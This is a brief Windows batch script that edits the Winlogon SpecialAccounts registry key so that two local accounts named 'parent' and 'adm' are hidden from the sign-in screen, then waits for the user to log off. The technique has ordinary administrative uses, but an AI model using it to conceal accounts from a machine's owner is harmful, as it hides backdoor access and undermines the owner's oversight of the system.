
REM Hide user 'parent'
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v parent /d 0 /f

REM Hide user 'adm'
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v adm /d 0 /f

REM wait
echo "Press Enter to logoff..."
pause
